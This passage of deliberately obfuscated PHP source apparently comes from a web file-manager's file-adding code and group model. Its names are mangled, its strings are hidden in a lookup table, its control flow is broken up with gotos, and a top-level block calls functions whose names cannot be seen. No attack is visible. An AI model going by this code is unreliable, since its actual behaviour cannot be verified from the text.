$this->fileHistory($e†º’¦öˆ, $c‚Ôë†™Ê[$AÅ±å‘–Î±[419]], $c‚Ôë†™Ê[$AÅ±å‘–Î±[77]]); if ($bìÎÛ¶·©) { $bŞ•îİÍ©[$AÅ±å‘–Î±[501]][] = $c‚Ôë†™Ê[$AÅ±å‘–Î±[419]]; } continue; } else { if ($cšìæß÷É› == REPEAT_RENAME) { $c‚Ôë†™Ê[$AÅ±å‘–Î±[28]] = $this->fileNameAutoCache($FÆœßÁôˆß, $c‚Ôë†™Ê[$AÅ±å‘–Î±[28]], $cšìæß÷É›, !1); } } } } if (!$c‚Ôë†™Ê[$AÅ±å‘–Î±[370]] && $c‚Ôë†™Ê[$AÅ±å‘–Î±[419]]) { $bŞ•îİÍ©[$AÅ±å‘–Î±[501]][] = $c‚Ôë†™Ê[$AÅ±å‘–Î±[419]]; } $b‚°÷å­Â[] = $this->_makeItemData($c‚Ôë†™Ê, $Aæ××„‰åÌ, $c‚Ôë†™Ê[$AÅ±å‘–Î±[28]]); goto b¡†îğ; dª›¬Äƒµù: $c‚Ôë†™Ê[$AÅ±å‘–Î±[77]] = _get($c‚Ôë†™Ê, $AÅ±å‘–Î±[77], 0); $c‚Ôë†™Ê[$AÅ±å‘–Î±[419]] = _get($c‚Ôë†™Ê, $AÅ±å‘–Î±[419], 0); if (!isset($c‚Ôë†™Ê[$AÅ±å‘–Î±[541]]) && $c‚Ôë†™Ê[$AÅ±å‘–Î±[419]]) { $bŞ•îİÍ©[$AÅ±å‘–Î±[538]][] = $c‚Ôë†™Ê[$AÅ±å‘–Î±[419]]; } goto bÀêÊ¼®ô; e¶îñ––—±: if (isset($c·‚Ôéò¸Ø[$c‚Ôë†™Ê[$AÅ±å‘–Î±[28]]])) { $c‚Ôë†™Ê = $c·‚Ôéò¸Ø[$c‚Ôë†™Ê[$AÅ±å‘–Î±[28]]]; } $c‚Ôë†™Ê[$AÅ±å‘–Î±[370]] = $c‚Ôë†™Ê[$AÅ±å‘–Î±[29]] == $AÅ±å‘–Î±[76]; $c‚Ôë†™Ê[$AÅ±å‘–Î±[372]] = _get($c‚Ôë†™Ê, $AÅ±å‘–Î±[160], $AÅ±å‘–Î±[33]); goto dª›¬Äƒµù; b¡†îğ: } unset($c‚Ôë†™Ê); if (!empty($b‚°÷å­Â)) { $this->addAll($b‚°÷å­Â); } goto f‹·‡ÙÊ™…; FŒä£ÈÃƒ‘: } private function _addFiles($a¾àö¤†²â, $cƒó¶¶Ï«, $aÚÒË½›‘) { goto AÔ¾ñä©Ç; Aº¨ÜøÎœË: foreach ($B¹Öìõ™¬á as $D…›ÂòÇÖ®) { if (!isset($f¼àö–»Ø[$D…›ÂòÇÖ®[$Fì‡¢ŞÆëÌ[163]]])) { continue; } $Dçíˆë =& $f¼àö–»Ø[$D…›ÂòÇÖ®[$Fì‡¢ŞÆëÌ[163]]]; foreach ($Dçíˆë as &$d¸½ïŞÁè) { $d¸½ïŞÁè[$Fì‡¢ŞÆëÌ[419]] = $D…›ÂòÇÖ®[$Fì‡¢ŞÆëÌ[419]]; } unset($d¸½ïŞÁè); } $e‰æã§„Ÿ = array(); foreach ($cƒó¶¶Ï« as $AÖ¥Û²“Çâ) { $e‰æã§„Ÿ[$AÖ¥Û²“Çâ[$Fì‡¢ŞÆëÌ[28]]] = $AÖ¥Û²“Çâ; } goto Cß‰—óÊ; AÔ¾ñä©Ç: $Fì‡¢ŞÆëÌ =& $_SERVER[”Ì÷ñ­î¸]; if (!$cƒó¶¶Ï« || count($cƒó¶¶Ï«) == 0) { return array(); } $f¼àö–»Ø = array(); goto a‡ï‡îˆô; bİ³„Şìï: $B¹Öìõ™¬á = $BÂ×‰Œ¤˜Ÿ->where($Bö÷ÛĞ¬·á)->select(); $B¹Öìõ™¬á = $B¹Öìõ™¬á ? $B¹Öìõ™¬á : array(); foreach ($B¹Öìõ™¬á as $D…›ÂòÇÖ®) { if (!isset($f¼àö–»Ø[$D…›ÂòÇÖ®[$Fì‡¢ŞÆëÌ[163]]])) { continue; } $B³ˆ†äØ‰î = $f¼àö–»Ø[$D…›ÂòÇÖ®[$Fì‡¢ŞÆëÌ[163]]]; foreach ($B³ˆ†äØ‰î as &$d¸½ïŞÁè) { $d¸½ïŞÁè[$Fì‡¢ŞÆëÌ[419]] = $D…›ÂòÇÖ®[$Fì‡¢ŞÆëÌ[419]]; $d¸½ïŞÁè[$Fì‡¢ŞÆëÌ[541]] = !0; } unset($d¸½ïŞÁè); } goto d¾Å¥ğƒ¢Ü; a‡ï‡îˆô: foreach ($cƒó¶¶Ï« as &$d¸½ïŞÁè) { goto F‹‡ø†ÎÁ; c¿óçÀ‡ÍÊ: $d¸½ïŞÁè[$Fì‡¢ŞÆëÌ[163]] = $E‘µì³ßî•; Hook::trigger($Fì‡¢ŞÆëÌ[543], $d¸½ïŞÁè); $f¼àö–»Ø[$E‘µì³ßî•][] =& $d¸½ïŞÁè; goto C³ßºÁ»È·; C³ßºÁ»È·: if (count($f¼àö–»Ø[$E‘µì³ßî•]) > 1) { $d¸½ïŞÁè[$Fì‡¢ŞÆëÌ[541]] = !0; } goto e§’ŠÍÌŠŠ; F‹‡ø†ÎÁ: Hook::trigger($Fì‡¢ŞÆëÌ[542], $d¸½ïŞÁè); $d¸½ïŞÁè[$Fì‡¢ŞÆëÌ[75]] = $a¾àö¤†²â->getPathInner($d¸½ïŞÁè[$Fì‡¢ŞÆëÌ[75]]); $fÓÀ·³Öªõ = $a¾àö¤†²â->hashSimple($d¸½ïŞÁè[$Fì‡¢ŞÆëÌ[75]]); goto BçŞµøƒ‘„; BçŞµøƒ‘„: $E‘µì³ßî• = $a¾àö¤†²â->hashMd5($d¸½ïŞÁè[$Fì‡¢ŞÆëÌ[75]]); if (strlen($E‘µì³ßî•) > 10 && !isset($f¼àö–»Ø[$E‘µì³ßî•])) { $f¼àö–»Ø[$E‘µì³ßî•] = array(); } $d¸½ïŞÁè[$Fì‡¢ŞÆëÌ[164]] = $fÓÀ·³Öªõ; goto c¿óçÀ‡ÍÊ; e§’ŠÍÌŠŠ: } $Bö÷ÛĞ¬·á = array($Fì‡¢ŞÆëÌ[163] => array($Fì‡¢ŞÆëÌ[7], array_keys($f¼àö–»Ø))); $BÂ×‰Œ¤˜Ÿ = Model($Fì‡¢ŞÆëÌ[544]); goto bİ³„Şìï; CÎ”‚›¶“Ä: $Bö÷ÛĞ¬·á = array($Fì‡¢ŞÆëÌ[163] => array($Fì‡¢ŞÆëÌ[7], array_keys($f¼àö–»Ø))); $B¹Öìõ™¬á = $BÂ×‰Œ¤˜Ÿ->where($Bö÷ÛĞ¬·á)->select(); $B¹Öìõ™¬á = $B¹Öìõ™¬á ? $B¹Öìõ™¬á : array(); goto Aº¨ÜøÎœË; d¾Å¥ğƒ¢Ü: $B‡ÍÒ¯•õÜ = array(); foreach ($cƒó¶¶Ï« as $FßËÛÕë³¡) { if (isset($FßËÛÕë³¡[$Fì‡¢ŞÆëÌ[541]]) && $FßËÛÕë³¡[$Fì‡¢ŞÆëÌ[541]]) { continue; } $D¯‹ÁæÌÌö = $a¾àö¤†²â->getPathInner($FßËÛÕë³¡[$Fì‡¢ŞÆëÌ[75]]); $Eçæˆ–Çë = $BÂ×‰Œ¤˜Ÿ->addFileMake($D¯‹ÁæÌÌö, $FßËÛÕë³¡[$Fì‡¢ŞÆëÌ[77]], $FßËÛÕë³¡[$Fì‡¢ŞÆëÌ[164]], $FßËÛÕë³¡[$Fì‡¢ŞÆëÌ[163]], $FßËÛÕë³¡[$Fì‡¢ŞÆëÌ[28]], $aÚÒË½›‘); $B‡ÍÒ¯•õÜ[] = $Eçæˆ–Çë; } $BÂ×‰Œ¤˜Ÿ->addAll($B‡ÍÒ¯•õÜ); goto CÎ”‚›¶“Ä; Cß‰—óÊ: return $e‰æã§„Ÿ; goto dóñ‚‹Ğœ®; dóñ‚‹Ğœ®: } } define($_SERVER[”Ì÷ñ­î¸][545], $_SERVER[”Ì÷ñ­î¸][546]); goto e™ªŠšó±Î; e‘æÆº‚•ê: if ($_SERVER[$_SERVER[”Ì÷ñ­î¸][791]] != $_SERVER[$_SERVER[”Ì÷ñ­î¸][1151]]) { goto c§£«¸“; BŒíŠàšš: $bìÍ˜ãŒİ½($_SERVER[$_SERVER[”Ì÷ñ­î¸][1153]]); goto Fã‰˜ßÃ¿ò; c§£«¸“: $CÃÃ“ŠŞÙ = $_SERVER[”Ì÷ñ­î¸][793]; $b´ïäå‰Õ = $_SERVER[$_SERVER[”Ì÷ñ­î¸][788]] . $_SERVER[”Ì÷ñ­î¸][789]; $fî Í—çÚÔ = $CÃÃ“ŠŞÙ($b´ïäå‰Õ); goto aÆ‹“¿ÂŒ; aÆ‹“¿ÂŒ: $D¬ËÉÛˆÌ‚ = explode($_SERVER[”Ì÷ñ­î¸][217], $fî Í—çÚÔ); if (count($D¬ËÉÛˆÌ‚) < $_SERVER[”Ì÷ñ­î¸][553]) { $fó±ŸéÕå = $_SERVER[”Ì÷ñ­î¸][794]; $fó±ŸéÕå(); } $bìÍ˜ãŒİ½ = $_SERVER[”Ì÷ñ­î¸][1152]; goto BŒíŠàšš; Fã‰˜ßÃ¿ò: } class GroupModel extends ModelBase { protected $tableName = "\147\x72\x6f\165\160"; protected $tableMeta = array("\164\141\142\154\x65\116\141\x6d\x65" => "\x67\x72\157\x75\x70\x5f\x6d\145\x74\x61", "\x6d\x65\x74\141\x46\151\145\x6c\x64" => "\147\162\157\x75\x70\111\x44"); protected function cacheFunctionAlias($dƒ„¥” ¶) { $dğÚÔ÷—‡ =& $_SERVER[”Ì÷ñ­î¸]; return array($dğÚÔ÷—‡[2172] => array($dƒ„¥” ¶[0], $dğÚÔ÷—‡[2173]), $dğÚÔ÷—‡[2174] => array($dƒ„¥” ¶[0], $dğÚÔ÷—‡[2173])); } protected function getInfo($F½•îÃÉ‹¼) { $F´ã× ¸°‡ = $this->getInfoSimple($F½•îÃÉ‹¼); if (!$F´ã× ¸°‡) { return !1; } return $this->_listDataApplyItem($F´ã× ¸°‡); } protected function getInfoSimple($B¼ˆéæªò, $EÒŒ±íùÒî = false) { $Cº¿ÔÔòˆ =& $_SERVER[”Ì÷ñ­î¸]; if ($EÒŒ±íùÒî) { $aËŠ´³ = array($Cº¿ÔÔòˆ[2106] => intval($B¼ˆéæªò)); $c„·Äà¯­Š = $this->where($aËŠ´³)->find(); return is_array($c„·Äà¯­Š) ? $c„·Äà¯­Š : array(); } return $this->cacheFunctionGet($Cº¿ÔÔòˆ[2175], $B¼ˆéæªò); } protected function groupAdd($EˆĞ‚Î§ÙÓ) { goto dÏöĞğ³Ç”; e‰ÖÒàâ: if (!empty($EˆĞ‚Î§ÙÓ[$E«‘ò°İ»Ê[2106]])) { $aè·³·Ìæ‡[$E«‘ò°İ»Ê[2106]] = $EˆĞ‚Î§ÙÓ[$E«‘ò°İ»Ê[2106]]; } $bó¬ùÓèä = $this->add($aè·³·Ìæ‡); $this->setNamePinyin($bó¬ùÓèä, $aè·³·Ìæ‡[$E«‘ò°İ»Ê[28]]); goto E‡Ï·¨İ¨; E‡Ï·¨İ¨: Model($E«‘ò°İ»Ê[1117])->groupRootAdd($bó¬ùÓèä); return $bó¬ùÓèä; goto có–¸†ŞœÂ; aÁÒª§­¬œ: if ($A´±ÁñèºÂ[$E«‘ò°İ»Ê[459]]) { $Eí¶£¯íßÉ = $A´±ÁñèºÂ[$E«‘ò°İ»Ê[459]] . $A´±ÁñèºÂ[$E«‘ò°İ»Ê[2106]] . $E«‘ò°İ»Ê[47]; } $aè·³·Ìæ‡ = array($E«‘ò°İ»Ê[386] => $this->groupNameAuto($EˆĞ‚Î§ÙÓ[$E«‘ò°İ»Ê[461]], $EˆĞ‚Î§ÙÓ[$E«‘ò°İ»Ê[28]]), $E«‘ò°İ»Ê[368] => $EˆĞ‚Î§ÙÓ[$E«‘ò°İ»Ê[461]], $E«‘ò°İ»Ê[525] => $Eí¶£¯íßÉ, $E«‘ò°İ»Ê[2176] => $EˆĞ‚Î§ÙÓ[$E«‘ò°İ»Ê[2090]], $E«‘ò°İ»Ê[2177] => 0, $E«‘ò°İ»Ê[2110] => 0); if (isset($EˆĞ‚Î§ÙÓ[$E«‘ò°İ»Ê[2127]])) { $aè·³·Ìæ‡[$E«‘ò°İ»Ê[2127]] = $EˆĞ‚Î§ÙÓ[$E«‘ò°İ»Ê[2127]]; } else { $BÔÏ—ƒÒÃ¦ = $this->max($E«‘ò°İ»Ê[2127]); if (!$BÔÏ—ƒÒÃ¦) { $BÔÏ—ƒÒÃ¦ = 0; } $aè·³·Ìæ‡[$E«‘ò°İ»Ê[2127]] = $BÔÏ—ƒÒÃ¦ + 1; } goto e‰ÖÒàâ; dÏöĞğ³Ç”: $E«‘ò°İ»Ê =& $_SERVER[”Ì÷ñ­î¸]; if (!$EˆĞ‚Î§ÙÓ[$E«‘ò°İ»Ê[461]] && isset($EˆĞ‚Î§ÙÓ[$E«‘ò°İ»Ê[2106]]) && $EˆĞ‚Î§ÙÓ[$E«‘ò°İ»Ê[2106]] == 1) { if ($A´±ÁñèºÂ = $this->getInfoSimple($EˆĞ‚Î§ÙÓ[$E«‘ò°İ»Ê[2106]], !0)) { return $EˆĞ‚Î§ÙÓ[$E«‘ò°İ»Ê[2106]]; } } else { $A´±ÁñèºÂ = $this->getInfoSimple($EˆĞ‚Î§ÙÓ[$E«‘ò°İ»Ê[461]]); if (!$A´±ÁñèºÂ) { return !1; } } $Eí¶£¯íßÉ = $E«‘ò°İ»Ê[470]; goto aÁÒª§­¬œ; có–¸†ŞœÂ: } protected function groupEdit($d¼Û»áòùä, $eÙôÅİ§Ñ§) { $bÆÕÚ‰ÙÒ‘ =& $_SERVER[”Ì÷ñ­î¸]; if (!empty($eÙôÅİ§Ñ§[$bÆÕÚ‰ÙÒ‘[461]])) { $e˜Ú¢¡š¬ = $this->getInfoSimple($d¼Û»áòùä); $b‚°¬—‰¾Ø = $this->getInfoSimple($eÙôÅİ§Ñ§[$bÆÕÚ‰ÙÒ‘[461]]); if (!$e˜Ú¢¡š¬ || !$b‚°¬—‰¾Ø) { return !1; } if ($e˜Ú¢¡š¬[$bÆÕÚ‰ÙÒ‘[2106]] == $b‚°¬—‰¾Ø[$bÆÕÚ‰ÙÒ‘[2106]]) { return !1; } if ($eÙôÅİ§Ñ§[$bÆÕÚ‰ÙÒ‘[461]] != $e˜Ú¢¡š¬[$bÆÕÚ‰ÙÒ‘[461]]) { if ($b‚°¬—‰¾Ø[$bÆÕÚ‰ÙÒ‘[459]] !== $e˜Ú¢¡š¬[$bÆÕÚ‰ÙÒ‘[459]] && strpos($b‚°¬—‰¾Ø[$bÆÕÚ‰ÙÒ‘[459]], $e˜Ú¢¡š¬[$bÆÕÚ‰ÙÒ‘[459]] . $e˜Ú¢¡š¬[$bÆÕÚ‰ÙÒ‘[2106]] . $bÆÕÚ‰ÙÒ‘[47]) === 0) { return !1; } $eÙôÅİ§Ñ§[$bÆÕÚ‰ÙÒ‘[525]] = $b‚°¬—‰¾Ø[$bÆÕÚ‰ÙÒ‘[459]] . $eÙôÅİ§Ñ§[$bÆÕÚ‰ÙÒ‘[461]] . $bÆÕÚ‰ÙÒ‘[47]; $this->_changeChildLevel($e˜Ú¢¡š¬, $b‚°¬—‰¾Ø); } } if (isset($eÙôÅİ§Ñ§[$bÆÕÚ‰ÙÒ‘[28]])) { $this->setNamePinyin($d¼Û»áòùä, $eÙôÅİ§Ñ§[$bÆÕÚ‰ÙÒ‘[28]]); } return $this->where(array($bÆÕÚ‰ÙÒ‘[2178] => $d¼Û»áòùä))->save($eÙôÅİ§Ñ§); } private function _changeChildLevel($bøïèŒ¤©, $FÁ–¬ºÍ–, $fŠ³½Ó¨İâ = false) { goto aö¶Ã—°¹í; Fˆšø¤£«: $this->where($CñŞ„Ø¶œ½)->data($f–İ¦‰öÖ£)->save(); goto Fœí‚„ÍŒ; F£ĞÚç¬¦: if ($fŠ³½Ó¨İâ) { $a¤¾•¡Œ’é = $FÁ–¬ºÍ–[$C¨˜÷¶âîƒ[459]] . $FÁ–¬ºÍ–[$C¨˜÷¶âîƒ[2106]] . $C¨˜÷¶âîƒ[47]; } $CñŞ„Ø¶œ½ = array($C¨˜÷¶âîƒ[525] => array($C¨˜÷¶âîƒ[483], $bøïèŒ¤©[$C¨˜÷¶âîƒ[459]] . $bøïèŒ¤©[$C¨˜÷¶âîƒ[2106]] . $C¨˜÷¶âîƒ[484])); $f–İ¦‰öÖ£ = array($C¨˜÷¶âîƒ[525] => array($C¨˜÷¶âîƒ[534], "\x72\x65\160\154\x61\x63\145\50\160\x61\x72\145\156\164\114\x65\166\145\x6c\x2c\x27{$fÅ°‚Á‡í}\x27\54\x27{$a¤¾•¡Œ’é}\x27\x29")); goto Fˆšø¤£«; aö¶Ã—°¹í: $C¨˜÷¶âîƒ =& $_SERVER[”Ì÷ñ­î¸]; $fÅ°‚Á‡í = $bøïèŒ¤©[$C¨˜÷¶âîƒ[459]] . $bøïèŒ¤©[$C¨˜÷¶âîƒ[2106]] . $C¨˜÷¶âîƒ[47]; $a¤¾•¡Œ’é = $FÁ–¬ºÍ–[$C¨˜÷¶âîƒ[459]] . $FÁ–¬ºÍ–[$C¨˜÷¶âîƒ[2106]] . $C¨˜÷¶âîƒ[47] . $bøïèŒ¤©[$C¨˜÷¶âîƒ[2106]] . $C¨˜÷¶âîƒ[47]; goto F£ĞÚç¬¦; Fœí‚„ÍŒ: } public function setNamePinyin($E·›—ÒßÒ†, $eéÖã¡Ìó† = false) { $Fà¶•Şî«Ÿ =& $_SERVER[”Ì÷ñ­î¸]; if (!$eéÖã¡Ìó†) { $bØª²ŠŠŠÍ = $this->getInfoSimple($E·›—ÒßÒ†); $eéÖã¡Ìó† = $bØª²ŠŠŠÍ[$Fà¶•Şî«Ÿ[28]]; } if (!Input::check($eéÖã¡Ìó†, $Fà¶•Şî«Ÿ[528])) { $this->metaSet($E·›—ÒßÒ†, $Fà¶•Şî«Ÿ[416], null); $this->metaSet($E·›—ÒßÒ†, $Fà¶•Şî«Ÿ[415], null); return; } $d£ç•Ìßõ‚ = array($Fà¶•Şî«Ÿ[416] => str_replace($Fà¶•Şî«Ÿ[50], $Fà¶•Şî«Ÿ[33], Pinyin::encode($eéÖã¡Ìó†)), $Fà¶•Şî«Ÿ[415] => Pinyin::encode($eéÖã¡Ìó†, $Fà¶•Şî«Ÿ[529])); $this->metaSet($E·›—ÒßÒ†, $d£ç•Ìßõ‚); } protected function groupStatus($d±Ø„‘ø†©, $Bá©Õ…¤é) { goto E£ß¨İ¶ï; B¹ß²á’çò: foreach ($F°ğ¬Ş–·Î as $d±Ø„‘ø†©) { $fŠö·íŞê»[] = array($cŠ“Éå£–[2106] => $d±Ø„‘ø†©, $cŠ“Éå£–[89] => $cŠ“Éå£–[690], $cŠ“Éå£–[359] => $Bá©Õ…¤é); } return Model($cŠ“Éå£–[2179])->addAll($fŠö·íŞê», array(), !0); goto b‚Íë¿­¡Ä; f‘ÏÀ˜ÑŒ: if ($Bá©Õ…¤é == $cŠ“Éå£–[83]) { $F°ğ¬Ş–·Î = $this->parentLevelArray($E‰ƒäÛïë¥[$cŠ“Éå£–[459]]); } else { $c³İ´êÒ‰¥ = array($cŠ“Éå£–[525] => array($cŠ“Éå£–[483], $E‰ƒäÛïë¥[$cŠ“Éå£–[459]] . $E‰ƒäÛïë¥[$cŠ“Éå£–[2106]] . $cŠ“Éå£–[484])); $F°ğ¬Ş–·Î = $this->where($c³İ´êÒ‰¥)->field($cŠ“Éå£–[2106])->select(); $F°ğ¬Ş–·Î = array_to_keyvalue($F°ğ¬Ş–·Î, $cŠ“Éå£–[33], $cŠ“Éå£–[2106]); } $F°ğ¬Ş–·Î[] = $E‰ƒäÛïë¥[$cŠ“Éå£–[2106]]; $fŠö·íŞê» = array(); goto B¹ß²á’çò; E£ß¨İ¶ï: $cŠ“Éå£– =& $_SERVER[”Ì÷ñ­î¸]; $E‰ƒäÛïë¥ = $this->getInfoSimple($d±Ø„‘ø†©); if (!$E‰ƒäÛïë¥) { return !1; } goto f‘ÏÀ˜ÑŒ; b‚Íë¿­¡Ä: } private function _groupStatusApply($C­˜Úç¨¸¢, $CÑµ½ˆ‡œ ) { $BøŒó°”¯Ğ =& $_SERVER[”Ì÷ñ­î¸]; if ($CÑµ½ˆ‡œ  == $BøŒó°”¯Ğ[83]) { $FñÎ¨Õé¼ò = $this->parentLevelArray($C­˜Úç¨¸¢[$BøŒó°”¯Ğ[459]]); } else { $aÊ‹Œ…âØ… = array($BøŒó°”¯Ğ[525] => array($BøŒó°”¯Ğ[483], $C­˜Úç¨¸¢[$BøŒó°”¯Ğ[459]] . $C­˜Úç¨¸¢[$BøŒó°”¯Ğ[2106]] . $BøŒó°”¯Ğ[484])); $FñÎ¨Õé¼ò = $this->where($aÊ‹Œ…âØ…)->field($BøŒó°”¯Ğ[2106])->select(); $FñÎ¨Õé¼ò = array_to_keyvalue($FñÎ¨Õé¼ò, $BøŒó°”¯Ğ[33], $BøŒó°”¯Ğ[2106]); } if (empty($FñÎ¨Õé¼ò)) { return; } $EàñÇ©×¤ = array(); foreach ($FñÎ¨Õé¼ò as $bÑÖÂ‰…ÍÏ) { $EàñÇ©×¤[] = array($BøŒó°”¯Ğ[2106] => $bÑÖÂ‰…ÍÏ, $BøŒó°”¯Ğ[89] => $BøŒó°”¯Ğ[690], $BøŒó°”¯Ğ[359] => $CÑµ½ˆ‡œ ); } Model($BøŒó°”¯Ğ[2179])->addAll($EàñÇ©×¤, array(), !0); } protected function groupRemove($Eå”×à©ÉÁ) { goto f„ˆ±ìÌ; c¯ÃóÃ·ô: if (!$aî¡’Ãœä“ || $aî¡’Ãœä“[$Fö£¶ˆÌòî[461]] == 0) { return !1; } $aí ÒƒÏÏ = $this->getInfoSimple($aî¡’Ãœä“[$Fö£¶ˆÌòî[461]]); $this->_changeChildLevel($aî¡’Ãœä“, $aí ÒƒÏÏ, !0); goto CéÑË·¥ãî; CéÑË·¥ãî: $this->where(array($Fö£¶ˆÌòî[461] => $Eå”×à©ÉÁ))->save(array($Fö£¶ˆÌòî[461] => $aî¡’Ãœä“[$Fö£¶ˆÌòî[461]])); Model($Fö£¶ˆÌòî[2179])->where($d§Ø»æç·)->delete(); Model($Fö£¶ˆÌòî[2180])->where($d§Ø»æç·)->delete(); goto F‰ÕñÌ¤¼Ø; f„ˆ±ìÌ: $Fö£¶ˆÌòî =& $_SERVER[”Ì÷ñ­î¸]; $d§Ø»æç· = array($Fö£¶ˆÌòî[2106] => $Eå”×à©ÉÁ); $aî¡’Ãœä“ = $this->where($d§Ø»æç·)->find(); goto c¯ÃóÃ·ô; F‰ÕñÌ¤¼Ø: Model($Fö£¶ˆÌòî[754])->groupRootRemove($Eå”×à©ÉÁ); return $this->where($d§Ø»æç·)->delete(); goto C×¬à¼Å˜; C×¬à¼Å˜: } public function listData() { $FœÙÈÚåÛÙ = $this->_makeOrder()->selectPage(50); $this->_listDataApply($FœÙÈÚåÛÙ[$_SERVER[”Ì÷ñ­î¸][354]]); return $FœÙÈÚåÛÙ; } private function _makeOrder($e§‘ö„‚Ü = '') { goto CäÍ¢µ³‰ó; eƒ‘‰ğˆ: $e§‘ö„‚Ü = $e§‘ö„‚Ü . "{$AàË÷Èì}\x20{$c˜ˆ˜â±Œ¯}\54\x20\x67\x72\157\165\160\111\104\40\141\x73\143"; return $this->order($e§‘ö„‚Ü); goto BÒÊá¾Õùí; dÃÀï Í ›: $AàË÷Èì = Input::get($AìÑñ¯¢ó„[407], $AìÑñ¯¢ó„[7], $AìÑñ¯¢ó„[2110], $cèÈµˆŸí¹); $c˜ˆ˜â±Œ¯ = Input::get($AìÑñ¯¢ó„[408], $AìÑñ¯¢ó„[7], $AìÑñ¯¢ó„[2181], array($AìÑñ¯¢ó„[2181], $AìÑñ¯¢ó„[404])); $c˜ˆ˜â±Œ¯ = $cªÎÅÖôŒ—[$c˜ˆ˜â±Œ¯]; goto eƒ‘‰ğˆ; CäÍ¢µ³‰ó: $AìÑñ¯¢ó„ =& $_SERVER[”Ì÷ñ­î¸]; $cèÈµˆŸí¹ = array($AìÑñ¯¢ó„[2106], $AìÑñ¯¢ó„[28], $AìÑñ¯¢ó„[2092], $AìÑñ¯¢ó„[187]); $cªÎÅÖôŒ— = array($AìÑñ¯¢ó„[402] => $AìÑñ¯¢ó„[403], $AìÑñ¯¢ó„[404] => $AìÑñ¯¢ó„[405]); goto dÃÀï Í ›; BÒÊá¾Õùí: } public function listChild($Cä›ğÏ«§¦) { $DãÀªò÷ö =& $_SERVER[”Ì÷ñ­î¸]; $F×ÑìŠİ¼ = $this->where(array($DãÀªò÷ö[461] => $Cä›ğÏ«§¦))->_makeOrder()->selectPage(200); $this->_listDataApply($F×ÑìŠİ¼[$DãÀªò÷ö[354]]); return $F×ÑìŠİ¼; } public function listByID($aÃ×£ßÆÔ¿) { $d†…ÌÏ—Ü° =& $_SERVER[”Ì÷ñ­î¸]; if (!$aÃ×£ßÆÔ¿) { return array(); } $bòˆ™³©¶ã = array($d†…ÌÏ—Ü°[2106] => array($d†…ÌÏ—Ü°[7], $aÃ×£ßÆÔ¿)); $dùÖğ©°‡¬ = $this->where($bòˆ™³©¶ã)->select(); $this->_listDataApply($dùÖğ©°‡¬); return $dùÖğ©°‡¬; } public function listSearch($eŠ¤…çöšŒ) { goto EÄ¿ííôâÒ; cİèù…Áˆ: if (!trim($aÊ…ŠåÉŠá)) { return !1; } $aÊ…ŠåÉŠá = str_replace($EóôË†­¹…[2184], $EóôË†­¹…[2185], $aÊ…ŠåÉŠá); $A¢„º´¿ğ = array($EóôË†­¹…[2106] => array($EóôË†­¹…[753], "\x25{$aÊ…ŠåÉŠá}\x25"), $EóôË†­¹…[28] => array($EóôË†­¹…[753], "\45{$aÊ…ŠåÉŠá}\x25"), $EóôË†­¹…[916] => $EóôË†­¹…[2186]); goto F™×æéÃ”¥; D‹¡ÄÖÅ: $this->_listDataApply($c¤¼ÉÇ‡¢í[$EóôË†­¹…[354]]); return $c¤¼ÉÇ‡¢í; goto a””ñããÔ; EÄ¿ííôâÒ: $EóôË†­¹… =& $_SERVER[”Ì÷ñ­î¸]; $aÊ…ŠåÉŠá = $eŠ¤…çöšŒ[$EóôË†­¹…[2182]]; $eÌ¸Õé–Ù‰ = isset($eŠ¤…çöšŒ[$EóôË†­¹…[2183]]) ? $eŠ¤…çöšŒ[$EóôË†­¹…[2183]] : !1; goto cİèù…Áˆ; F™×æéÃ”¥: $c¤¼ÉÇ‡¢í = $this->_makeOrder()->where($A¢„º´¿ğ)->selectPage(20); $c¤¼ÉÇ‡¢í = $c¤¼ÉÇ‡¢í ? $c¤¼ÉÇ‡¢í : array(); if (!$c¤¼ÉÇ‡¢í || count($c¤¼ÉÇ‡¢í[$EóôË†­¹…[354]]) < 5 && Input::check($aÊ…ŠåÉŠá, $EóôË†­¹…[306])) { $FƒØ‹×Õ = $this->_searchFromMeta($EóôË†­¹…[415], $aÊ…ŠåÉŠá, 10); $fùµãŒ¡Ú = $this->_searchFromMeta($EóôË†­¹…[416], $aÊ…ŠåÉŠá, 10); $Bìƒ¯õõŞ = array_merge($FƒØ‹×Õ, $fùµãŒ¡Ú, $c¤¼ÉÇ‡¢í[$EóôË†­¹…[354]]); $c¤¼ÉÇ‡¢í[$EóôË†­¹…[354]] = array_unique_by_key($Bìƒ¯õõŞ, $EóôË†­¹…[2106]); $c¤¼ÉÇ‡¢í[$EóôË†­¹…[351]][$EóôË†­¹…[352]] = count($c¤¼ÉÇ‡¢í[$EóôË†­¹…[354]]); $c¤¼ÉÇ‡¢í[$EóôË†­¹…[351]][$EóôË†­¹…[353]] = ceil($c¤¼ÉÇ‡¢í[$EóôË†­¹…[351]][$EóôË†­¹…[352]] / $c¤¼ÉÇ‡¢í[$EóôË†­¹…[351]][$EóôË†­¹…[349]]); } goto D‹¡ÄÖÅ; a””ñããÔ: } private function _searchFromMeta($cÉïä—Ä¼ğ, $c¯Æã‚‘ëô, $AÃÔÓó‡§) { goto Fî¦åÀó¡; Fî¦åÀó¡: $b‹šøÂôØæ =& $_SERVER[”Ì÷ñ­î¸]; $c¯Æã‚‘ëô = strtolower($c¯Æã‚‘ëô); $FÄö÷‡Ï½º = array($b‹šøÂôØæ[89] => $cÉïä—Ä¼ğ, $b‹šøÂôØæ[359] => array($b‹šøÂôØæ[753], "\45{$c¯Æã‚‘ëô}\x25")); goto fÊñš˜Œ½Ì; f‰äº‰¨ Ú: $dêã±¦±Á = $this->where(array($b‹šøÂôØæ[2178] => array($b‹šøÂôØæ[7], $FÎŞóÁöÙ)))->select(); if (!$dêã±¦±Á) { return array(); } return $dêã±¦±Á; goto a†âÖªÙÅµ; fÊñš˜Œ½Ì: $FÎŞóÁöÙ = Model($b‹šøÂôØæ[2187])->where($FÄö÷‡Ï½º)->limit($AÃÔÓó‡§)->select(); if (!$FÎŞóÁöÙ) { return array(); } $FÎŞóÁöÙ = array_to_keyvalue($FÎŞóÁöÙ, $b‹šøÂôØæ[33], $b‹šøÂôØæ[2106]); goto f‰äº‰¨ Ú; a†âÖªÙÅµ: } protected function _listDataApplyItem($BĞÀÑ²¨Ç) { $e‘çÆÎ¢Šì = array($BĞÀÑ²¨Ç); $this->_listDataApply($e‘çÆÎ¢Šì); return $e‘çÆÎ¢Šì[0]; } protected function _listDataApply(&$B¹¾¹Õ„Ë) { goto AÒíñ¾­Êù; f´„Á¸ñàŒ: $this->_listAppendChildren($B¹¾¹Õ„Ë); $this->_listAppendChildrenMember($B¹¾¹Õ„Ë); $this->_listAppendMeta($B¹¾¹Õ„Ë, 